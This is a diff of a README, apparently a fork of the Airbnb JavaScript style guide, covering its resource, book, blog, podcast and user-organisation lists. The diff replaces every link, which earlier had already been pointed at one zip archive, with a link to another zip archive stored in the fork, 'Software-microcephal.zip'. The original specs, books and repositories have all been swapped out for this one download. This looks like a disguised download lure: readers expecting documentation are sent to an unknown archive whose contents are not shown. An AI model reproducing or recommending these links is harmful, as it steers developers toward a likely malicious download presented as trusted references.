+  - [String vs Array Concat](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Try/Catch Cost In a Loop](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Bang Function](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [jQuery Find vs Context, Selector](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [innerHTML vs textContent for script text](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Long String Concatenation](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Are Javascript functions like `map()`, `reduce()`, and `filter()` optimized for traversing arrays?](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
   - Loading...
 
 **[⬆ back to top](#table-of-contents)**
@@ -2825,80 +2825,80 @@ Other Style Guides
 
 **Learning ES6**
 
-  - [Draft ECMA 2015 (ES6) Spec](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip~https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [ExploringJS](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [ES6 Compatibility Table](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Comprehensive Overview of ES6 Features](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [Draft ECMA 2015 (ES6) Spec](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip~https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [ExploringJS](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [ES6 Compatibility Table](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Comprehensive Overview of ES6 Features](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 **Read This**
 
-  - [Standard ECMA-262](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [Standard ECMA-262](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 **Tools**
 
   - Code Style Linters
-    + [ESlint](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - [Airbnb Style .eslintrc](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-    + [JSHint](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - [Airbnb Style .jshintrc](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-    + [JSCS](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - [Airbnb Style Preset](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+    + [ESlint](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - [Airbnb Style .eslintrc](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+    + [JSHint](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - [Airbnb Style .jshintrc](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+    + [JSCS](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - [Airbnb Style Preset](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 **Other Style Guides**
 
-  - [Google JavaScript Style Guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [jQuery Core Style Guidelines](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Principles of Writing Consistent, Idiomatic JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [Google JavaScript Style Guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [jQuery Core Style Guidelines](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Principles of Writing Consistent, Idiomatic JavaScript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 **Other Styles**
 
-  - [Naming this in nested functions](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Christian Johansen
-  - [Conditional Callbacks](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Ross Allen
-  - [Popular JavaScript Coding Conventions on Github](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - JeongHoon Byun
-  - [Multiple var statements in JavaScript, not superfluous](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Ben Alman
+  - [Naming this in nested functions](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Christian Johansen
+  - [Conditional Callbacks](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Ross Allen
+  - [Popular JavaScript Coding Conventions on Github](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - JeongHoon Byun
+  - [Multiple var statements in JavaScript, not superfluous](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Ben Alman
 
 **Further Reading**
 
-  - [Understanding JavaScript Closures](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Angus Croll
-  - [Basic JavaScript for the impatient programmer](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Dr. Axel Rauschmayer
-  - [You Might Not Need jQuery](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Zack Bloom & Adam Schwartz
-  - [ES6 Features](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Luke Hoban
-  - [Frontend Guidelines](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Benjamin De Cock
+  - [Understanding JavaScript Closures](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Angus Croll
+  - [Basic JavaScript for the impatient programmer](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Dr. Axel Rauschmayer
+  - [You Might Not Need jQuery](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Zack Bloom & Adam Schwartz
+  - [ES6 Features](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Luke Hoban
+  - [Frontend Guidelines](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Benjamin De Cock
 
 **Books**
 
-  - [JavaScript: The Good Parts](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Douglas Crockford
-  - [JavaScript Patterns](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Stoyan Stefanov
-  - [Pro JavaScript Design Patterns](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)  - Ross Harmes and Dustin Diaz
-  - [High Performance Web Sites: Essential Knowledge for Front-End Engineers](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Steve Souders
-  - [Maintainable JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Nicholas C. Zakas
-  - [JavaScript Web Applications](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Alex MacCaw
-  - [Pro JavaScript Techniques](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - John Resig
-  - [Smashing https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip JavaScript Everywhere](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Guillermo Rauch
-  - [Secrets of the JavaScript Ninja](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - John Resig and Bear Bibeault
-  - [Human JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Henrik Joreteg
-  - [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Kim Joar Bekkelund, Mads Mobæk, & Olav Bjorkoy
-  - [JSBooks](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Julien Bouquillon
-  - [Third Party JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Ben Vinegar and Anton Kovalyov
-  - [Effective JavaScript: 68 Specific Ways to Harness the Power of JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - David Herman
-  - [Eloquent JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Marijn Haverbeke
-  - [You Don't Know JS: ES6 & Beyond](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Kyle Simpson
+  - [JavaScript: The Good Parts](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Douglas Crockford
+  - [JavaScript Patterns](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Stoyan Stefanov
+  - [Pro JavaScript Design Patterns](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)  - Ross Harmes and Dustin Diaz
+  - [High Performance Web Sites: Essential Knowledge for Front-End Engineers](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Steve Souders
+  - [Maintainable JavaScript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Nicholas C. Zakas
+  - [JavaScript Web Applications](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Alex MacCaw
+  - [Pro JavaScript Techniques](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - John Resig
+  - [Smashing https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip JavaScript Everywhere](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Guillermo Rauch
+  - [Secrets of the JavaScript Ninja](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - John Resig and Bear Bibeault
+  - [Human JavaScript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Henrik Joreteg
+  - [https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Kim Joar Bekkelund, Mads Mobæk, & Olav Bjorkoy
+  - [JSBooks](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Julien Bouquillon
+  - [Third Party JavaScript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Ben Vinegar and Anton Kovalyov
+  - [Effective JavaScript: 68 Specific Ways to Harness the Power of JavaScript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - David Herman
+  - [Eloquent JavaScript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Marijn Haverbeke
+  - [You Don't Know JS: ES6 & Beyond](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) - Kyle Simpson
 
 **Blogs**
 
-  - [DailyJS](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [JavaScript Weekly](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [JavaScript, JavaScript...](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Bocoup Weblog](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Adequately Good](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [NCZOnline](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Perfection Kills](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Ben Alman](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Dmitry Baranovskiy](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [Dustin Diaz](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [nettuts](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [DailyJS](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [JavaScript Weekly](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [JavaScript, JavaScript...](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Bocoup Weblog](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Adequately Good](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [NCZOnline](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Perfection Kills](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Ben Alman](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Dmitry Baranovskiy](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [Dustin Diaz](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [nettuts](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 **Podcasts**
 
-  - [JavaScript Air](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - [JavaScript Jabber](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [JavaScript Air](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - [JavaScript Jabber](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
 
 **[⬆ back to top](#table-of-contents)**
@@ -2907,81 +2907,81 @@ Other Style Guides
 
   This is a list of organizations that are using this style guide. Send us a pull request and we'll add you to the list.
 
-  - **4Catalyzer**: [4Catalyzer/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Aan Zee**: [AanZee/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Adult Swim**: [adult-swim/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Airbnb**: [airbnb/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Apartmint**: [apartmint/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Ascribe**: [ascribe/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Avalara**: [avalara/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Avant**: [avantcredit/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Billabong**: [billabong/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Bisk**: [bisk/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Blendle**: [blendle/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Brainshark**: [brainshark/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Chartboost**: [ChartBoost/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **ComparaOnline**: [comparaonline/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Compass Learning**: [compasslearning/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **DailyMotion**: [dailymotion/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **DoSomething**: [DoSomething/eslint-config](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Digitpaint** [digitpaint/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Ecosia**: [ecosia/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Evernote**: [evernote/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Evolution Gaming**: [evolution-gaming/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **EvozonJs**: [evozonjs/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **ExactTarget**: [ExactTarget/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Expensify** [Expensify/Style-Guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Flexberry**: [Flexberry/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Gawker Media**: [gawkermedia/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **General Electric**: [GeneralElectric/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **GoodData**: [gooddata/gdc-js-style](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Grooveshark**: [grooveshark/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **How About We**: [howaboutwe/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Huballin**: [huballin/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **HubSpot**: [HubSpot/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Hyper**: [hyperoslo/javascript-playbook](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **InfoJobs**: [InfoJobs/JavaScript-Style-Guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Intent Media**: [intentmedia/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Jam3**: [Jam3/Javascript-Code-Conventions](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **JeopardyBot**: [kesne/jeopardy-bot](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **JSSolutions**: [JSSolutions/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **KickorStick**: [kickorstick/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Kinetica Solutions**: [kinetica/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **M2GEN**: [M2GEN/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Mighty Spring**: [mightyspring/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **MinnPost**: [MinnPost/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **MitocGroup**: [MitocGroup/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **ModCloth**: [modcloth/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Money Advice Service**: [moneyadviceservice/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Muber**: [muber/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **National Geographic**: [natgeo/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **National Park Service**: [nationalparkservice/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Nimbl3**: [nimbl3/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Orion Health**: [orionhealth/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **OutBoxSoft**: [OutBoxSoft/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Peerby**: [Peerby/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Razorfish**: [razorfish/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **reddit**: [reddit/styleguide/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **React**: [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **REI**: [reidev/js-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Ripple**: [ripple/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **SeekingAlpha**: [seekingalpha/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Shutterfly**: [shutterfly/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Springload**: [springload/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **StratoDem Analytics**: [stratodem/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **SteelKiwi Development**: [steelkiwi/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **StudentSphere**: [studentsphere/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **SysGarage**: [sysgarage/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Syzygy Warsaw**: [syzygypl/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Target**: [target/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **TheLadders**: [TheLadders/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **The Nerdery**: [thenerdery/javascript-standards](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **T4R Technology**: [T4R-Technology/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **VoxFeed**: [VoxFeed/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **WeBox Studio**: [weboxstudio/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Weggo**: [Weggo/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **Zillow**: [zillow/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
-  - **ZocDoc**: [ZocDoc/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - **4Catalyzer**: [4Catalyzer/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Aan Zee**: [AanZee/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Adult Swim**: [adult-swim/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Airbnb**: [airbnb/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Apartmint**: [apartmint/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Ascribe**: [ascribe/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Avalara**: [avalara/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Avant**: [avantcredit/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Billabong**: [billabong/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Bisk**: [bisk/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Blendle**: [blendle/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Brainshark**: [brainshark/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Chartboost**: [ChartBoost/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **ComparaOnline**: [comparaonline/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Compass Learning**: [compasslearning/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **DailyMotion**: [dailymotion/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **DoSomething**: [DoSomething/eslint-config](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Digitpaint** [digitpaint/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Ecosia**: [ecosia/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Evernote**: [evernote/javascript-style-guide](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
+  - **Evolution Gaming**: [evolution-gaming/javascript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
